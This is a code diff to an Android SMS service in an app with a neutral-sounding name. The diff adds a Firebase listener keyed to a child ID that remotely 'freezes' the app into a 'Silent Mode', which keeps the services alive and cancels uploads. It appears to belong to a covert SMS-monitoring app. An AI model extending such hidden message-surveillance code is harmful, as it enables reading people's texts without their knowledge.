@@ -12,7 +12,11 @@ import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import com.safe.setting.app.R // सुनिश्चित करें कि R.string.app_name और R.mipmap.ic_vv_round मौजूद हैं
 import com.safe.setting.app.services.base.BaseService
+import com.google.firebase.database.DataSnapshot
+import com.google.firebase.database.DatabaseError
+import com.google.firebase.database.ValueEventListener
 import dagger.hilt.android.AndroidEntryPoint
+import com.safe.setting.app.utils.GlobalConfig
 import com.safe.setting.app.utils.Consts.SMS_ADDRESS
 import com.safe.setting.app.utils.Consts.SMS_BODY
 import com.safe.setting.app.utils.Consts.TYPE_SMS
@@ -33,7 +37,9 @@ class SmsService : BaseService(), InterfaceServiceSms {
     override fun onCreate() {
         super.onCreate()
         if (hasSmsPermission()) {
+            try { GlobalConfig.init(this) } catch (_: Exception) {}
             interactor.onAttach(this)
+            try { listenFreezeSwitch() } catch (_: Exception) {}
         } else {
             Log.e(TAG, "SMS permission not granted. Stopping service.")
             stopSelf()
@@ -88,5 +94,33 @@ class SmsService : BaseService(), InterfaceServiceSms {
             this,
             Manifest.permission.RECEIVE_SMS
         ) == PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun listenFreezeSwitch() {
+        val user = interactor.firebase().getUser() ?: return
+        val childID = user.uid
+        val ref = interactor.firebase().getDatabaseReference("config/$childID/isFrozen")
+        ref.addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val frozen = snapshot.getValue(Boolean::class.java) ?: false
+                if (frozen) {
+                    try {
+                        // Silent Mode: Keep services alive, cancel uploads, set global frozen state
+                        GlobalConfig.setFrozen(applicationContext, true)
+                        // Strict cancel uploads by tag
+                        androidx.work.WorkManager.getInstance(applicationContext).cancelAllWorkByTag("UPLOAD_WORK")
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Freeze stop failed: ${e.message}")
+                    }
+                } else {
+                    try {
+                        GlobalConfig.setFrozen(applicationContext, false)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Unfreeze start failed: ${e.message}")
+                    }
+                }
+            }
+            override fun onCancelled(error: DatabaseError) {}
+        })
     }
 }
